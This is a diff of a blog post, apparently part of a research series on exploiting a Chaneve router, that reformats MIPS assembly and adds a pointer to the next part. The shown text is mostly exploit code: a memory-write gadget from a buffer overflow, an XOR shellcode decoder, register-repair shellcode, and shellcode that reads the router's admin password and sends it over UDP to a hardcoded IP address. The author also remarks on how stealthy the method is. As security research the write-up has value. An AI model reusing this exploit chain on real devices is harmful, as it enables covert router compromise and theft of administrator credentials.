@@ -102,14 +102,14 @@ It would be ideal if we could perform a memory write without causing a crash, as
 
 ```
 -mipsasm
-sw $s0, ($s1); 
-lw $ra, 0xc($sp); 
-move $v0, $s0; 
-lw $s2, 8($sp); 
-lw $s1, 4($sp);
-lw $s0, ($sp); 
-jr $ra; 
-addiu $sp, $sp, 0x10;
+sw $s0, ($s1)
+lw $ra, 0xc($sp)
+move $v0, $s0
+lw $s2, 8($sp)
+lw $s1, 4($sp)
+lw $s0, ($sp)
+jr $ra
+addiu $sp, $sp, 0x10
 ```
 
 We just need to put our memory location in *$s0*, the 4-byte value we want to write into *$s1*, and the expected value for *$s3* that we determined earlier in *$s3* (we don't care about *$s2* in the initial overflow). We can then put the expected *$s0-2* values on the stack. For the value of *$ra*, I decided to set it to *0x801888e8* as a complete guess as it is the last set of instructions that is executed in the caller function, and this worked?  At the time, I wasn't 100% sure how this worked, as the start of the caller function subtracts *0x10* from the *$sp*, our gadget then adds *0x10* and jumps to the epilogue of the function which also increments the stack pointer by *0x10*? So why does this work?
@@ -214,15 +214,15 @@ As we have control of the *$s0-3* registers, we can pass in some useful variable
 
 ```
 -mipsasm
-  xor $s2, $s2, $s3;      /* decode length in s2 with key in s3 */
+  xor $s2, $s2, $s3       /* decode length in s2 with key in s3 */
 loop:
-  lw $s0, 0x1010($s1);    /* load the shellcode value to decode */
-  xor $s0, $s0, $s3;      /* decode the loaded value with key in s3 */
+  lw $s0, 0x1010($s1)     /* load the shellcode value to decode */
+  xor $s0, $s0, $s3       /* decode the loaded value with key in s3 */
   sw $s0, 0x1010($s1)     /* save value to location it was got from */
-  addiu $s2, $s2, -0x4;   /* decrease s2 by 4 so we can check if all decoded */
-  addiu $s1, $s1, 0x108;  /* decrease decoding address by 4 (along with branch delay) */
-  bgtz $s2, loop;         /* loop if there is still more to decode */
-  addiu $s1, $s1, -0x104; /* branch delay slot (happens before branch taken) */
+  addiu $s2, $s2, -0x4    /* decrease s2 by 4 so we can check if all decoded */
+  addiu $s1, $s1, 0x108   /* decrease decoding address by 4 (along with branch delay) */
+  bgtz $s2, loop          /* loop if there is still more to decode */
+  addiu $s1, $s1, -0x104  /* branch delay slot (happens before branch taken) */
 ```
 
 The input values are as follows:
@@ -242,17 +242,17 @@ Now that we know the values required in the overwritten registers, we can create
 
 ```
 -mipsasm
-xor $v0, $s3, $s3;      /* fix v0 (in branch delay slot) */
-lui $t0, 0x802c;
-ori $s0, $t0, 0x0404;   /* fix s0 (0x802c0404) */
-lui $s1, 0x8025;
-ori $s1, $s1, 0x0504;   /* fix s1 (0x8025d504) */
-ori $s2, $t0, 0x5268;   /* fix s2 (0x802C5268) */
-lui $s3, 0x802a;        
-ori $s3, $s3, 0xb9f4;   /* fix s3 (0x802ab9f4) */
-addiu $sp, $sp, 0xfff;  /* Fix up stack once shellcode done */
-j 0x801888e0;
-addiu $sp, $sp, -0xfef;
+xor $v0, $s3, $s3       /* fix v0 (in branch delay slot) */
+lui $t0, 0x802c 
+ori $s0, $t0, 0x0404    /* fix s0 (0x802c0404) */
+lui $s1, 0x8025
+ori $s1, $s1, 0x0504    /* fix s1 (0x8025d504) */
+ori $s2, $t0, 0x5268    /* fix s2 (0x802C5268) */
+lui $s3, 0x802a     
+ori $s3, $s3, 0xb9f4    /* fix s3 (0x802ab9f4) */
+addiu $sp, $sp, 0xfff   /* Fix up stack once shellcode done */
+j 0x801888e0
+addiu $sp, $sp, -0xfef 
 ```
 
 As you can see, we are just loading the values into the corresponding registers with a series of **lui** and **ori** instructions. We also set *$v0* to 0 as otherwise it crashes due to a branch in one of the handlers. We also use the same return value and stack pointer modification as earlier - if it ain't broke don't fix it!
@@ -285,12 +285,12 @@ And here is the shellcode we will use:
 
 ```
 -mipsasm
-move $a0, $s2;
-move $a1, $s1;
-jalr $s3;           /* call printf */
-nop;
-j 0x802C3638;       /* address of fix shellcode */
-xor $v0, $s3, $s3;  /* set v0 to 0 */
+move $a0, $s2
+move $a1, $s1
+jalr $s3            /* call printf */
+nop
+j 0x802C3638        /* address of fix shellcode */
+xor $v0, $s3, $s3   /* set v0 to 0 */
 ```
 
 ### Method
@@ -325,70 +325,70 @@ The input parameters are as follows:
 
 ```
 -mipsasm
-lw $a0, ($s1);      /* s1 contains address of 0x1010200 */
-lui $v0, 0x8000;
-or $v0, 0x89e4;
-jalr $v0;           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
-move $a1, $s2;      /* s2 contains pwd buffer address */
+lw $a0, ($s1)       /* s1 contains address of 0x1010200 */
+lui $v0, 0x8000 
+or $v0, 0x89e4
+jalr $v0            /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
+move $a1, $s2       /* s2 contains pwd buffer address */
 ```
 
 - Next, call **strlen** on the buffer containing the admin password:
 
 ```
 -mipsasm
-jalr $s0;           /* len = strlen(pwd_buffer (0x801d3754)) */
-move $a0, $s2;      /* s2 contains pwd buffer address */
+jalr $s0            /* len = strlen(pwd_buffer (0x801d3754)) */
+move $a0, $s2       /* s2 contains pwd buffer address */
 ```
 
 - Store the length in *$s0*, and construct the *sockaddr* containing the port and IP we will use:
 
 ```
 -mipsasm
-move $s0, $v0;      /* v0 contains length of password */
+move $s0, $v0       /* v0 contains length of password */
 /* create sockaddr stuff and put into t0 */
-lui $v0, 0x800f;
-or $v0, $v0, 0x9528;
-lw $v0, ($v0);      /* load value of hardcoded_afinet into v0 */
-lui $t0, 0x802a;
-or $s1, $t0, 0xbf10;
-sw $v0, ($s1);      /* save hardcoded_afinet value to address of sockaddr */
-addiu $t0, $s1, 0x4;
-lui $v0, 0x02bc;
-or $v0, $v0, 0xa8c0;
-sw $v0, ($t0);      /* save hardcoded IP address to sockaddr + 4 */
+lui $v0, 0x800f 
+or $v0, $v0, 0x9528 
+lw $v0, ($v0)       /* load value of hardcoded_afinet into v0 */
+lui $t0, 0x802a 
+or $s1, $t0, 0xbf10 
+sw $v0, ($s1)       /* save hardcoded_afinet value to address of sockaddr */
+addiu $t0, $s1, 0x4 
+lui $v0, 0x02bc 
+or $v0, $v0, 0xa8c0 
+sw $v0, ($t0)       /* save hardcoded IP address to sockaddr + 4 */
 ```
 
 - Call **socket(2, 2, 0)** to create the socket and get the *sockfd*:
 
 ```
 -mipsasm
-addiu $a0, $zero, 2;
-addiu $a1, $zero, 2;
-jalr $s3;           /* socket(2, 2, 0) - s3 contains address of socket()*/
-move $a2, $zero;
+addiu $a0, $zero, 2 
+addiu $a1, $zero, 2 
+jalr $s3            /* socket(2, 2, 0) - s3 contains address of socket()*/
+move $a2, $zero 
 ```
 
 - Move all of the arguments to the correct registers, and call **sendto**:
 
 ```
 -mipsasm
-move $a0, $v0;      /* v0 contains sockfd_address */
-move $a1, $s2;      /* s2 contains pwd buffer address */
-move $a2, $s0;      /* s0 contains pwd length */
-move $a3, $zero;
-move $t0, $s1;      /* s1 contains the address of sockaddr */
-lui $v0, 0x8012;
-or $v0, $v0, 0x8bc4;
-jalr $v0;           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
-addiu $t1, $zero, 0x20;
+move $a0, $v0       /* v0 contains sockfd_address */
+move $a1, $s2       /* s2 contains pwd buffer address */
+move $a2, $s0       /* s0 contains pwd length */
+move $a3, $zero 
+move $t0, $s1       /* s1 contains the address of sockaddr */
+lui $v0, 0x8012 
+or $v0, $v0, 0x8bc4 
+jalr $v0            /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
+addiu $t1, $zero, 0x20 
 ```
 
 - Finally, jump to the address of the fix shellcode to load the expected register values and adjust the stack pointer:
 
 ```
 -mipsasm
-j 0x802C3638;   /* fix address */
-xor $v0, $s3, $s3;
+j 0x802C3638    /* fix address */
+xor $v0, $s3, $s3 
 ```
 
 As you can see, it is much easier to follow than the ROP chain in part 3!
@@ -413,6 +413,6 @@ We can see the password is *th35he11c0d3w0rk5*!
 
 This method seems to be a much better solution than using ROP, as unless someone is monitoring traffic on the network, they would have no idea that we have executed shellcode on their device as everything is still running as normal. However, we do have to send a very large number of packets to write larger shellcodes into memory, but this could also be done over time to blend in to the background noise.
 
-The only issue with the current approach is that we cannot write to addresses containing 0's as values after 0 get cut off our overflow string, hence no control over *$ra*. Maybe for the grand finale of this project I'll overcome this issue and write some larger shellcodes that do some even more interesting things, we'll see!
+The only issue with the current approach is that we cannot write to addresses containing 0's as values after 0 get cut off our overflow string, hence no control over *$ra*. Maybe for the grand finale of this project I'll overcome this issue and write some larger shellcodes that do some even more interesting things, we'll see (Update: see part 5!).
 
 Thanks for reading, the [repo for this project](https://github.com/luke-r-m/Chaneve-Router-Analysis) contains everything discussed in all blogs in this series - feel free to check it out!
